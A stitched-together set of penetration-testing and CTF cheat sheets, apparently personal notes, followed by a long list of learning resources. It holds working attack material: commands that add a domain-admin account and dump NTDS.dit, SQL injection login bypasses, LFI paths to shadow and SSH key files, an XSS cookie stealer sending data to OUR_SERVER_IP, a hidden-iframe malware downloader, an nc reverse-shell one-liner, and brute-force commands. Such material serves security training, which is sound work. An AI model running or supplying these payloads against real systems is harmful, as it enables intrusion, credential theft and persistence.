------------------------------------------------------------

```bash
Use ‚Äònot powershell‚Äô [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)
```

Persistence
------------------------------------------------------------

```bash
net user username "password" /ADD
```

```bash
net group "Domain Admins" %username% /DOMAIN /ADD
```

Gather NTDS.dit file
------------------------------------------------------------

```bash
ntdsutil
```

```bash
activate instance ntds
```

```bash
ifm
```

```bash
create full C:\ntdsutil
```

```bash
quit
```

```bash
quit
```

SQLInjections
------------------------------------------------------------

Common Injections for Login Forms:
------------------------------------------------------------

```bash
admin' --
```

```bash
admin' #
```

```bash
admin'/*
```

```bash
' or 1=1--
```

```bash
' or 1=1#
```

```bash
' or 1=1/*
```

```bash
') or '1'='1--
```

```bash
') or ('1'='1‚Äî
```

Uploading Files to Target Machine
------------------------------------------------------------

TFTP

```bash
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

FTP

```bash
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
```

CertUtil (download file from windows)

```bash
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
me
```

PHP

```bash
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

Python

```bash
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

HTTP: Powershell

```bash
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

HTTP: Linux

```bash
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

NetCat

```bash
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

Web Application
------------------------------------------------------------

LFI (Local File Inclusion)
------------------------------------------------------------

if we found an LFI, we can check each of those paths,

we can use burpsuite intruder to see all
Useful LFI files
Linux
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/[0-9]*/fd/[0-9]*
/proc/mounts
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
Apache
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
Debian/Ubuntu -> /var/log/apache2/access.log
FreeBSD -> /var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
MySQL
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
Windows
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt

Situation

```
http://<target>/index.php?parameter=value

```

How to Test
------------------------------------------------------------

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index

```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd
OR
http://<target>/script.php?page=..//..//..//..//..//..//../etc/passwd
OR
curl http://<target>/script.php?page=..//..//..//..//..//..//../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini

```

LFI Payloads
------------------------------------------------------------

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

XSS
------------------------------------------------------------

Reflected
------------------------------------------------------------

Simple test
------------------------------------------------------------

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

<plaintext>

Simple XSS test
------------------------------------------------------------

<script>alert('Found')</script>

"><script>alert(Found)</script>">

<script>alert(String.fromCharCode(88,83,83))</script>

Bypass filter of tag script
------------------------------------------------------------

`" onload="alert(String.fromCharCode(88,83,83))`

" onload="alert('XSS')

bla is not a valid image, so this cause an error

<img src='bla' onerror=alert("XSS")>

Persistent
------------------------------------------------------------

>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";

PHP collector
------------------------------------------------------------

`> cookie.txtchmod 777 cookie.txt`

edit a php page like colector.php as follow:

<?php $cookie=GET['cookie']; $useragent=$_SERVER['HTTP_USER_AGENT']; $file=fopen('cookie.txt', 'a'); fwrite($file,"USER AGENT:$useragent || COOKIE=$cookie\n"); fclose($file);
?>

Script to put in page:

<scritp>new Image().src="http://OUR_SERVER_IP/colector.php?cookie="+document.cookie;</script>

Malware Donwloader via XSS
------------------------------------------------------------

<iframe src="http://OUR_SERVER_IP/OUR_MALWARE" height="0" width="0"></iframe>

How to play Mario with XSS
------------------------------------------------------------

<iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>

<input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>

XSS payloads
------------------------------------------------------------

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)

MySql Cheat Sheet
------------------------------------------------------------

```bash
mysql -u [username] -p; #connect, you will be asked for password
SHOW DATABASES;
use DB_NAME;
SHOW TABLES;
select * from TABLE;
```

[MySQL cheatsheet](https://devhints.io/mysql)

[MySQL Cheat Sheet](https://www.mysqltutorial.org/mysql-cheat-sheet.aspx)

Misc
------------------------------------------------------------

Linux file permissions
------------------------------------------------------------

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%202.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%202.png)

Linux Cheat Sheet
------------------------------------------------------------

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%203.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%203.png)

[](https://itblogr.com/wp-content/uploads/2020/04/The-Concise-Blue-Team-cheat-Sheets.pdf?fbclid=IwAR2lG6uxX3cMwu4G80Vwl_ZxpddwEPDqsyXb27yw5xjMOnAB1zX9ZEjDl78)

[Hacking Cheat Sheets](https://cheatography.com/tag/hacking/)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%204.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%204.png)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%205.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%205.png)

vi cheat sheet

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%206.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%206.png)

find cheat sheet
------------------------------------------------------------

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%207.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%207.png)

Simple Local Web Servers
------------------------------------------------------------

Python local web server command, handy for serving up shells and exploits on an attacking machine.

```bash
python -m SimpleHTTPServer 80
python3 -m http.server
python -m pyftpdlib -p 21 #start a local ftp server with anonymous:anonymouscer

updog

ruby -rwebrick -e "WEBrick::HTTPServer.new
(:Port => 80, :DocumentRoot => Dir.pwd).start"

php -S 0.0.0.0:80
```

Hash Examples
------------------------------------------------------------

Likely just use **hash-identifier** for this but here are some example hashes:

[Untitled](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%20Database%202c8912d8c7b747859491d93a41439662.csv)

Text Manipulation
------------------------------------------------------------

[awk](https://www.howtogeek.com/562941/how-to-use-the-awk-command-on-linux/) - command-line text manipulation dynamo
------------------------------------------------------------

```bash
awk -F: '{print $1,$6}' /etc/passwd
    $0: Represents the entire line of text.
    $1: Represents the first field.
    $2: Represents the second field.
    $7: Represents the seventh field.
    $45: Represents the 45th field.
    $NF: Stands for ‚Äúnumber of fields,‚Äù and represents the last field.
    -F (separator string)
```

Sublime Text Editor
------------------------------------------------------------

```jsx
Splitting the Selection into Lines

Select a block of lines, and then split it into many selections, one per line, using:

    Windows/Linux: Ctrl+Shift+L
```

sed cheat sheet
------------------------------------------------------------

![https://s3.studylib.net/store/data/008266685_1-65c7d170c2600d5fd58feafc3611414f.png](https://s3.studylib.net/store/data/008266685_1-65c7d170c2600d5fd58feafc3611414f.png)

Useful links
------------------------------------------------------------

[A cheat-sheet for password crackers](https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers)

[Penetration testing and webapp cheat sheets](https://doxsec.wordpress.com/2017/07/21/penetration-testing-and-webapp-cheat-sheets/)

[The Ultimate List of SANS Cheat Sheets](https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/?utm_medium=Social&utm_source=Twitter&utm_content=EMEA&utm_campaign=Security%20Trends%20Blog)

[](https://www.sans.org/security-resources/posters/blueprint-building-pen-tester/160/download)

[](https://www.sans.org/security-resources/posters/pen-test-pivots-payloads/180/download)

[coreb1t/awesome-pentest-cheat-sheets](https://github.com/coreb1t/awesome-pentest-cheat-sheets)

[Penetrating Testing/Assessment Workflow](https://gist.github.com/jivoi/724e4b4b22501b77ef133edc63eba7b4)

[0DAYsecurity.com - The fastest resource to a proactive security](http://www.0daysecurity.com/pentest.html)

[OSCP Ultimate CheatSheet - ByteFellow](https://www.bytefellow.com/oscp-ultimate-cheatsheet/)

[Linux Privilege Escalation CheatSheet for OSCP - ByteFellow](https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/)

[Windows Privilege Escalation Cheatsheet for OSCP - ByteFellow](https://www.bytefellow.com/windows-privilege-escalation-cheatsheet-for-oscp/)

[Cheat Sheet](https://jok3rsecurity.com/cheat-sheet/)

[CountablyInfinite/oscp_cheatsheet](https://github.com/CountablyInfinite/oscp_cheatsheet)

[OSCP: Developing a Methodology](https://falconspy.medium.com/oscp-developing-a-methodology-32f4ab471fd6)

[Passing OSCP](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[](https://storage.googleapis.com/vkmedia-wp-blogg-vk/uploads/uploads/sites/710/2013/08/Linux-101-Hacks.pdf)

ba≈üka bir g√ºn
-------------

overall useful website/tools
-----------------------------

hacktricks.xyz reference book

‚Äì web ‚Äì

[webhook.site](https://webhook.site/) to get request bin
[dirsearch](https://github.com/maurosoria/dirsearch) to brute force directory
[GitTools](https://github.com/internetwache/GitTools) to pull git repo from public website, if .git is exposed
[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) to generate php filter chain
[postman](https://www.postman.com/) to send http requests
[burpsuite](https://portswigger.net/burp/communitydownload) to intercept http request packages
[wireshark](https://www.wireshark.org/) to capture/analyse network traffic
[csp evaluator](https://csp-evaluator.withgoogle.com/) to evaluate CSP

‚Äì rev ‚Äì

[disasm.pro](https://disasm.pro/) to disassemble bytecode online
[fernflower](https://github.com/fesh0r/fernflower) to decompile java bytecode, made by JetBrains
[angr](https://github.com/angr/angr) to get solution of input or sth

‚Äì misc ‚Äì

[z3](https://github.com/Z3Prover/z3) to find solution under constrains
[dcode](https://www.dcode.fr/en) to decode anything
[CyberChef](https://gchq.github.io/CyberChef/) combine multiple tools to do sth
[pylingual](https://pylingual.io/) decompiling pyc file

‚Äì forensics / osint ‚Äì

[saucenao](https://saucenao.com/) to search for image source
[aperisolve.com](https://www.aperisolve.com/) do stego for image online
[photo-forensics](https://29a.ch/photo-forensics/) do stego for image online
[stegseek](https://github.com/RickdeJager/stegseek) crack jpeg password
[exiftool](https://github.com/exiftool/exiftool) print out EXIF
[maigret](https://github.com/soxoj/maigret) to search for social media account, one of forks of sherlock
[F5](https://github.com/matthewgao/F5-steganography) a common F5 implementation
[autopsy](https://github.com/sleuthkit/autopsy) a GUI tool for forensics
[volatility](https://github.com/volatilityfoundation/volatility) a CLI tool for forensics memory dump
[zsteg](https://github.com/zed-0xff/zsteg) to do stego for PNG/BMP
[png chunk checker](https://www.nayuki.io/page/png-file-chunk-inspector)
[binwalk](https://github.com/ReFirmLabs/binwalk)

‚Äì crypto ‚Äì

[RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) to attack RSA
[hashclash](https://github.com/cr-marcstevens/hashclash) for MD5 collision
[hashcat](https://github.com/hashcat/hashcat) to attack hash
[yafu](https://github.com/bbuhrow/yafu) to factorize number
[John the Ripper](https://github.com/openwall/john) jumbo to crack password

‚Äì pwn ‚Äì

[checksec.sh]() to check binary security properties
[gef](https://github.com/hugsy/gef) very useful GDB plugin / [gdb-dashboard](https://github.com/cyrus-and/gdb-dashboard) Modular visual interface for GDB
[pwntools](https://github.com/Gallopsled/pwntools) utility for pwn in python
[shellcheck](https://www.shellcheck.net/) check fault in shell script
[rp](https://github.com/0vercl0k/rp/) fast ROP gadget finder
[compiler explorer](https://godbolt.org/) Online code to assembly
[Opcode and Instruction Reference Home](http://ref.x86asm.net/geek.html) for 32 and 64 bits
[Syscall Reference](https://hackeradam.com/x86-64-linux-syscalls/) for 64 bits
[dectect it easy](https://github.com/horsicq/Detect-It-Easy/)

‚Äì I don‚Äôt know where to put ‚Äì

[gtfobins](https://gtfobins.github.io/) to search for binaries that can be used to get root shell under certain conditions
[revshells.com](https://www.revshells.com/) to generate reverse shell code
[PEASS-ng](https://github.com/carlospolop/PEASS-ng) to enumerate windows/linux privilege escalation


Web
---

add . dot at the end of domain to bypass simple check [example.com.](example.com.)

DOM Clobbering
--------------

[blink SECCON CTF 2023](https://blog.arkark.dev/2023/09/21/seccon-quals/#web-blink)

ba≈üka bir g√ºn
-------------

Discovery
----------

NMAP
----

Basic nmap scan:
nmap -vv -sC -sV -oN nmap.log $IP

Complete nmap scan:
nmap -vv -A -p- -oN nmap-complete.log $IP

Web Directory and Query Parameters Bruteforce
---------------------------------------------

Using gobuster:
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL

Using wfuzz:
wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ

Using wfuzz to bruteforce query parameters:
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ

Recursive directory scan with wfuzz:
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ

Web
---

HTTP Form Bruteforce
--------------------

Using Hydra:
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"

Wordpress
---------

WPScan + password bruteforce:
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt

Subdomain Bruteforce
--------------------

Using wfuzz:
wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356
Note: you will need to adjust the --hc and --hw parameters to your needs. Check wfuzz -h for more information about those.

Using gobuster:
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32


Cracking
--------

ZIP
---

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip

Hashes
------

Using hashcat:
hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt


Bruteforce SSH
--------------

Using hydra:
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh

Steganography
-------------

Crack steghide passphrase using stegracker: Install:
pip3 install stegcracker

Run:
python3 -m stegcracker tocrack.jpg

Privescs Discovery
------------------

Find privescs exploiting SUID binaries:
find / -perm -u=s -type f 2>/dev/null

Find privescs by listing sudo permissions:
sudo -l

Enumerate interesting files, processes, and privescs using Linpeas:
Install [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) on your machine.
Transfer it to the target machine.
Make it executable, run it, and tee the output to a log file for further analysis.

chmod +x linpeas.sh
./linpeas.sh | tee linpeas.log

Transferring Files
------------------

Open an HTTP server:
cd into the directory you want to access one or more files from.
Open an HTTP server:
PYTHON3
python3 -m http.server -b $IP $PORT
PHP
php -S $IP:$PORT

Access the file:
----------------
Wget
wget http://$IP:$PORT/file
Curl
curl http://$IP:$PORT/file -o target_file
Netcat
nc $IP $PORT > target_file

Using SCP:
----------

Send
scp /path/to/file user@$HOST:/path/
Send with custom name
scp /path/to/file user@$HOST:/path/different_name
Get
scp user@$HOST:/path/to/file /local/directory

Note: To connect with an SSH key, you may need to use the -i flag followed by the path to the key.

Using netcat:
-------------

Server
nc -nvlp $PORT < file
Client
nc $IP $PORT > file

ba≈üka bir g√ºn
-------------

# Table of Contents

- **[Resources](#resources)**
  * [YouTube (We love video resources)](#youtube-we-love-video-resources)
  * [Practice / Learning Sites](#practice--learning-sites)
    + [CTFs](#ctfs)
    + [General](#general)
    + [Pwn](#pwn)
    + [Rev](#rev)
    + [Web](#web)
    + [Crypto](#crypto)
    + [Smart Contracts](#smart-contracts)
	+ [Cloud](#cloud)
    + [Pentesting](#pentesting)

- **[CTF Cheat Sheet](#ctf-cheat-sheet)**
  * [Forensics / Steganography](#forensics--steganography)
      - [General](#general)
      - [Audio](#audio)
      - [Image](#image)
      - [Video](#video)
      - [Machine Image](#machine-image)
      - [Pcap](#pcap)
  * [Pwn / Binary Exploitation](#pwn--binary-exploitation)
      - [General](#general-1)
      - [Buffer overflow](#buffer-overflow)
      - [PIE (Positional Independent Execution)](#pie-positional-independent-execution)
      - [NX (Non-executable)](#nx-non-executable)
      - [ROP (for statically compiled binaries)](#rop-for-statically-compiled-binaries)
      - [Stack Canary](#stack-canary)
      - [Format String Vulnerabilities](#format-string-vulnerabilities)
      - [Shellcode](#shellcode)
      - [Return-to-Libc](#return-to-libc)
  * [Reverse Engineering](#reverse-engineering)
      - [SMT Solvers](#smt-solvers)
      - [Reversing byte-by-byte checks](#reversing-byte-by-byte-checks-side-channel-attack)
      - [Searching strings with gef](#searching-strings-with-gef)
  * [Web](#web-1)
      - [Fuzzing input fields](#fuzzing-input-fields)
  * [Crypto](#crypto-1)
    + [CyberChef](#cyberchef)
    + [Common Ciphers](#common-ciphers)
    + [RSA](#rsa)
      - [Grab RSA Info with pycryptodome](#grab-rsa-info-with-pycryptodome)
      - [Chinese Remainder Theorem (p,q,e,c)](#chinese-remainder-theorem-pqec)
      - [Coppersmith attack (c,e)](#coppersmith-attack-ce)
      - [Pollards attack (n,e,c)](#pollards-attack-nec)
      - [Wiener Attack (n,e,c)](#wiener-attack-nec)

    + [Base16, 32, 36, 58, 64, 85, 91, 92](#base16-32-36-58-64-85-91-92)
  * [Box](#box)
    + [Connecting](#connecting)
    + [Enumeration](#enumeration)
    + [Privilege escalation](#privilege-escalation)
    + [Listen for reverse shell](#listen-for-reverse-shell)
    + [Reverse shell](#reverse-shell)
    + [Get interactive shell](#get-interactive-shell)
      - [Linux](#linux)
      - [Windows / General](#windows--general)
  * [OSINT](#osint)
  * [Misc](#misc)

# Resources
{:#resources}

## YouTube Channels
{:#youtube-we-love-video-resources}
- [John Hammond](https://www.youtube.com/user/RootOfTheNull)
    - Used to make a lot of CTF videos, but has moved on to other things
    - Still a ton of useful videos. The CTF ones especially are amazing for teaching people brand new to cyber.
- [Live Overflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
    - Makes extremely interesting and in-depth videos about cyber.
    - Has an [amazing pwn series](https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&ab_channel=LiveOverflow)
- [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
    - Makes writeups of every single HackTheBox 
    machine
        - Talks about diff ways to solve and why things work. Highly recommend
- [Computerphile](https://www.youtube.com/user/Computerphile)
    - Same people as Numberphile, but cooler. Makes really beginner-level and intuitive videos about basic concepts.
- [pwn.college](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
    - ASU professor that has tons of videos on pwn
    - Guided course material: [https://pwn.college/](https://pwn.college/)
    - Tons of practice problems: [https://dojo.pwn.college/](https://dojo.pwn.college/)
- [PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)
    - Very high-quality and easy-to-understand animated videos about diff topics
    - Topics are a bit advanced, but easily understandable
- [Martin Carlisle](https://www.youtube.com/user/carlislemc/featured)
    - Makes amazing writeup videos about the picoCTF challenges.
- [Sam Bowne](https://www.youtube.com/channel/UCC2OBhIt1sHE4odV05RYP1w)
    - CCSF professor that open sources all of his lectures and course material on [his website](https://samsclass.info/)
- [UFSIT](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
    - UF Cyber team (I'm a bit biased, but def one of the better YouTube channels for this)
- [Gynvael](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg)
    - Makes amazingly intuitive video writeups. Has done the entirety of picoCTF 2019 (that's a lot)
- [Black Hills Information Security](https://www.youtube.com/@BlackHillsInformationSecurity)
    - Security firm that makes a ton of educational content
    - Always doing free [courses](https://www.antisyphontraining.com/pay-what-you-can/) and [webcasts](https://discord.gg/BHIS) about security topics
- [stacksmashing](https://www.youtube.com/c/stacksmashing/videos)
    - Amazing reverse engineering & hardware hacking videos
    - Has a really cool series of him reverse engineering WannaCry
- [Ben Greenberg](https://www.youtube.com/channel/UCsNzKjRToTA2G0lR8FiduWQ)
    - GMU prof with a bunch of pwn and malware video tutorials
    - A bit out-of-date, but still good
- [InfoSecLab at Georgia Tech](https://www.youtube.com/channel/UCUcnLCrBVK9gS6ctEUVvkjA/featured)
    - Good & advanced in-depth lectures on pwn
    - Requires some background knowledge
- [RPISEC](https://www.youtube.com/c/RPISEC_talks/videos)
    - RPI University team meetings
    - Very advanced and assumes a bit of cs background knowledge
- [Matt Brown](https://www.youtube.com/@mattbrwn)
    - Embedded Security Pentester
    - Makes great beginner-friendly videos about IoT hacking
    

### Talks

Here are some slides I've put together: [hackback.zip/presentations](https://hackback.zip/presentations)

## Practice / Learning Sites
{:#practice--learning-sites}
### CTFs
- [PicoCTF](https://play.picoctf.org/practice)
    - Tons of amazing practice challenges.
    - Definitely the gold standard for getting started
- [UCF](https://ctf.hackucf.org/challenges)
    - Good overall, but great pwn practice
    - I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/1.CTFs/HackUCF)
- [hacker101](https://ctf.hacker101.com/ctf)
    - CTF, but slightly more geared toward pentesting
- [CSAW](https://365.csaw.io/)
    - Down 90% the time and usually none of the connections work
    - If it is up though, it has a lot of good introductory challenges
- [CTF101](https://ctf101.org/)
    - One of the best intros to CTFs I've seen (gj osiris)
    - Very succinct and beginner-friendly


### General

- [HackTheBox](hackthebox.com)
    - The OG box site
        - Boxes are curated to ensure quality
    - Now has some CTF-style problems
    - Now has courses to start learning
- [TryHackMe](https://tryhackme.com/hacktivities)
    - Slightly easier boxes than HackTheBox
    - Step-by-step challenges
    - Now has "learning paths" to guide you through topics
- [CybersecLabs](https://www.cyberseclabs.co.uk/)
    - Great collection of boxes
    - Has some CTF stuff
- [VulnHub](https://www.vulnhub.com/)
    - Has vulnerable virtual machines you have to deploy yourself
    - Lots of variety, but hard to find good ones imo

### Pwn
- [pwnable.kr](http://pwnable.kr/index.php)
    - Challenges with good range of difficulty
- [pwnable.tw](https://pwnable.tw/challenge/)
    - Harder than pwnable.kr
    - Has writeups once you solve the chall
- [pwnable.xyz](https://pwnable.xyz/challenges/)
    - More pwn challenges
    - Has writeups once you solve the chall
    - You can upload your own challenges once you solve all of them
- [pwn dojo](https://dojo.pwn.college)
    - Best collection of pwn challenges in my opinion
    - Backed up with slides teaching how to do it & has a discord if you need help
- [nightmare](https://guyinatuxedo.github.io/)
    - Gold standard for pwning C binaries
    - Has a few mistakes/typos, but amazing overall
- [pwn notes](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
    - Notes from some random person online
    - Very surface-level, but good intro to everything
- [Security Summer School](https://security.cs.pub.ro/summer-school/wiki/start)
    - University of Bucharest Security Course
    - Very beginner-friendly explanations 
- [RPISEC MBE](https://github.com/RPISEC/MBE)
    - RPI's Modern Binary Exploitation Course
    - Has a good amount of labs/projects for practice & some (slightly dated) lectures
- [how2heap](https://github.com/shellphish/how2heap)
    - Heap Exploitation series made by ASU's CTF team
    - Includes a very cool debugger feature to show how the exploits work
- [ROPEmporium](https://ropemporium.com/)
    - Set of challenges in every major architecture teaching Return-Oriented-Programming
    - Very high quality. Teaches the most basic to the most advanced techniques. 
    - I'm currently adding my own writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/ROPEmporium/)
- [Phoenix Exploit Education](https://exploit.education/phoenix/)
    - Tons of binary exploitation problems ordered by difficulty
    - Includes source and comes with a VM that has all of the binaries.

### Rev
- [challenges.re](https://challenges.re/)
    - So many challenges 0_0
    - Tons of diversity
- [reversing.kr](http://reversing.kr/)
- [crackmes.one](https://crackmes.one)
    - Tons of crackme (CTF) style challenges
- [Malware Unicorn Workshops](https://malwareunicorn.org/#/workshops)
	- Free workshops about Reverse engineering and Malware Analysis

### Web
- [websec.fr](http://websec.fr/#)
    - Lots of web challenges with a good range of difficulty
- [webhacking.kr](https://webhacking.kr/chall.php)
    - Has archive of lots of good web challenges
- [Securing Web Applications](https://samsclass.info/129S/129S_S22.shtml)
    - Open source CCSF Course
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
    - Very much geared toward pentesting, but useful for exploring web in CTFs
    - Over 100 vulns/challenges in total
- [PortSwigger](https://portswigger.net/web-security/dashboard)
    - Gold standard for understanding web hacking
    - Tons of amazing challenges & explanations
- [DVWA](https://dvwa.co.uk/)
    - Very much geared toward pentesting, but useful for exploring web in CTFs
- [bWAPP](http://www.itsecgames.com/)
    - Very much geared toward pentesting, but useful for exploring web in CTFs
- [CTF Challenge](https://ctfchallenge.com/register)
    - Collection of web challenges made by Adam Langley that are made to be as realistic as possible.
    - Good for getting bug bounty experience

### Crypto
- [CryptoHack](https://cryptohack.org/)
    - I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/CryptoHack)
- [cryptopals](https://cryptopals.com/)
    - The OG crypto challenge site.
- [CryptoCTF](https://cr.yp.toc.tf)
    - Annual cryptography CTF. Previous years accessible at `20{19,20,21,22,23,24}.cr.yp.toc.tf`.

### Smart Contracts
- [Capture the Ether](https://capturetheether.com/)

### Cloud
- [CloudFoxable](https://cloudfoxable.bishopfox.com)
    - Walks you through setting up a vulnerable environment to be exploited using [cloudfox](https://github.com/BishopFox/cloudfox)
- [flaws.cloud](https://flaws.cloud)
    - Free challenges that involve finding secrets in S3, EC2, and Lambda

### Pentesting
- [hacker101](https://www.hacker101.com/videos)
- [hacksplaining](https://www.hacksplaining.com/lessons)
- [Exploit developement](https://samsclass.info/127/127_S22.shtml)
    - Open source CCSF Course
- [Intro to Security](https://cseweb.ucsd.edu/~dstefan/cse127-fall21/)
    - UC San Diego course taught by Deian Stefan
    - Covers basic pwn and crypto 
- [Active Directory Cheat Sheet](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet)
- [WADComs](https://wadcoms.github.io/)
    - Interactive cheat sheet for Windows/AD environments
- [LOLBAS](https://lolbas-project.github.io/)
    - Interactive cheat sheet for **Windows** "Living off the land" binaries, scripts, and libraries for exploitation 
- [GTFOBins](https://gtfobins.github.io/)
    - Interactive cheat sheet for **Linux** "Living off the land" techniques.


# CTF Cheat Sheet
## Forensics / Steganography
{:#forensics--steganography}

#### General
{:#general}

- [AperiSolve](https://github.com/Zeecka/AperiSolve)
    - Tool that automatically runs other stego tools
- Really good resource from John Hammond for different types of challenges:
    - [https://github.com/JohnHammond/ctf-katana](https://github.com/JohnHammond/ctf-katana)
- Another very great cheat sheet for creating and solving challenges:
    - [https://github.com/apsdehal/awesome-ctf/blob/master/README.md](https://github.com/apsdehal/awesome-ctf/blob/master/README.md)
- file
    - `file <file.xyz>`
    - Determines the type of file
- steghide
    - `steghide extract -sf <file.xyz>`
    - Extracts embedded files
- [stegseek](https://github.com/RickdeJager/stegseek)
    - `stegseek <file> <password list>`
    - Extracts embedded files using a wordlist
    - super super quick
- binwalk
    - `binwalk -M --dd=".*" <file.xyz>`
    - Extracts embedded files
- exiftool
    - `exiftool <file.xyz>`
    - Reads metadata
- strings
